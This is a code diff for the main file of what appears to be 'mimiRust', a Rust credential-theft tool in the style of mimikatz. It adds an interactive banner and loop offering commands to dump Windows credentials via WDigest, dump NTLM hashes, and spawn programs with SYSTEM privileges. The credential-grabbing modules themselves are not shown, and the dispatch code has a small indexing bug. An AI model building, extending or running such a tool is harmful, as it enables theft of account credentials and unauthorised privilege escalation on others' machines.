@@ -1,16 +1,18 @@
-pub mod password_grabbing;
-pub mod escalation_permissions;
+pub mod passwords;
+pub mod privilege;
 pub mod utilities;
 
-use password_grabbing::{
+use passwords::{
     wdigest::Wdigest, 
     ntlm::Ntlm
 };
 
-use escalation_permissions::Escalation;
+use privilege::Escalation;
+use utilities::Utils;
 
 use clap::Parser;
 use anyhow::Result;
+use std::io::{stdin,stdout,Write};
 
 #[derive(Parser, Debug)]
 #[clap(about, author)]
@@ -25,15 +27,29 @@ struct Args {
 
     /// Dumps systems NTLM hashes
     #[clap(long)]
-    dump_ntlm_hashes: bool,
+    dump_hashes: bool,
 }
 
 
 fn main() -> Result<()> {
-    let args = Args::parse();
 
-    if args.spawn_path.len() == 0 && args.dump_credentials == false && args.dump_ntlm_hashes == false {
-        println!("To see options please do: mimiRust.exe --help");
+    let args = Args::parse();
+    if args.spawn_path.len() == 0 && args.dump_credentials == false && args.dump_hashes == false {
+        println!("{}", banner());
+        loop {
+            if !Utils::is_elevated() {
+                let input = Utils::get_user_input(2);
+                handle_user_input(input)?;
+            } else {
+                if !Utils::is_system() {
+                    let input = Utils::get_user_input(1);
+                    handle_user_input(input)?;
+                } else {
+                    let input = Utils::get_user_input(0);
+                    handle_user_input(input)?;
+                }
+            }
+        }
     }
 
     if args.spawn_path.len() > 0 {
@@ -44,8 +60,45 @@ fn main() -> Result<()> {
         Wdigest::grab()?;
     }
 
-    if args.dump_ntlm_hashes {
+    if args.dump_hashes {
         Ntlm::grab()?;
     }
+
+    Ok(())
+}
+
+fn banner() -> String {
+    return "
+    ███▄ ▄███▓ ██▓ ███▄ ▄███▓ ██▓ ██▀███   █    ██   ██████ ▄▄▄█████▓
+    ▓██▒▀█▀ ██▒▓██▒▓██▒▀█▀ ██▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ ▓  ██▒ ▓▒
+    ▓██    ▓██░▒██▒▓██    ▓██░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   ▒ ▓██░ ▒░
+    ▒██    ▒██ ░██░▒██    ▒██ ░██░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒░ ▓██▓ ░ 
+    ▒██▒   ░██▒░██░▒██▒   ░██▒░██░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒  ▒██▒ ░ 
+    ░ ▒░   ░  ░░▓  ░ ▒░   ░  ░░▓  ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   
+    ░  ░      ░ ▒ ░░  ░      ░ ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░    ░    
+    ░      ░    ▒ ░░      ░    ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░    ░      
+           ░    ░         ░    ░     ░        ░           ░           
+                                                                      
+
+    ".to_string();
+}
+
+fn handle_user_input(args: Vec<String>) -> Result<()> {
+    match args[0].as_str() {
+        "dump-credentials" => {
+            Wdigest::grab()?;
+        },
+        "dump-hashes" => {
+            Ntlm::grab()?;
+        },
+        "spawn-path" => {
+            if args.len() >= 1 {
+                Escalation::get_system(args[1].clone())?;
+            }
+        },
+        _ => {
+            println!("\ndump-credentials           Dumps systems credentials through Wdigest\ndump-hashes                Dumps systems NTLM hashesn\nspawn-path <SPAWN_PATH>    Spawn program with SYSTEM permissions from location\n\n")
+        },
+    };
     Ok(())
 }
